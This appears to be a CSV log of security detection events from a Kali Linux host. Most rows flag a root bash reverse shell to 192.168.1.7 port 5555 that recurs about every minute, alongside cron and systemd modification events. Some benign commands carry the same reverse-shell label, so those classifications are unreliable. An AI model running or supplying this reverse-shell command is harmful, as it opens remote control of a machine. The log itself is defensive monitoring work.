Time,host,user,"Command Line",Executable,"Event Type",Description
"1748436061.854399",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436001.714634",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748436001.708416",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435941.626444",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435941.615896",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435890.248",kali,kali,tee,"/usr/bin/tee","Cron Modification","Cron file modified using /usr/bin/tee"
"1748435881.540076",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435840.942",kali,kali,,,"Systemd Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.942",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Systemd Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435840.934",kali,kali,,,"Cron Modification",""
"1748435839.021247",kali,root,"find /root/.nvm/alias /root/.nvm/bash_completion /root/.nvm/CODE_OF_CONDUCT.md /root/.nvm/CONTRIBUTING.md /root/.nvm/Dockerfile /root/.nvm/GOVERNANCE.md /root/.nvm/install.sh /root/.nvm/LICENSE.md /root/.nvm/Makefile /root/.nvm/nvm-exec /root/.nvm/nvm.sh /root/.nvm/package.json /root/.nvm/PROJECT_CHARTER.md /root/.nvm/README.md /root/.nvm/rename_test.sh /root/.nvm/ROADMAP.md /root/.nvm/test /root/.nvm/update_test_mocks.sh /root/.nvm/versions /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 -name . -o -type d -prune -o -path v14.*","/usr/bin/find","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435821.474607",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435761.405724",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435752.870969",kali,root,"find /root/.nvm/alias /root/.nvm/bash_completion /root/.nvm/CODE_OF_CONDUCT.md /root/.nvm/CONTRIBUTING.md /root/.nvm/Dockerfile /root/.nvm/GOVERNANCE.md /root/.nvm/install.sh /root/.nvm/LICENSE.md /root/.nvm/Makefile /root/.nvm/nvm-exec /root/.nvm/nvm.sh /root/.nvm/package.json /root/.nvm/PROJECT_CHARTER.md /root/.nvm/README.md /root/.nvm/rename_test.sh /root/.nvm/ROADMAP.md /root/.nvm/test /root/.nvm/update_test_mocks.sh /root/.nvm/versions /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 /root/.nvm/versions/node/v14.21.3 /root/.nvm/versions/node/v18.20.4 -name . -o -type d -prune -o -path v14.*","/usr/bin/find","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435711.250629",kali,kali,"run-parts --list --regex ^[a-zA-Z0-9_][a-zA-Z0-9._-]*\.sh$ /etc/profile.d","/usr/bin/run-parts","Suspicious Bash Execution","Reverse shell attempt via bash"
"1748435701.679803",kali,root,"/bin/sh -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.7/5555 0&gt;&amp;1","/usr/bin/dash","Suspicious Bash Execution","Reverse shell attempt via bash"
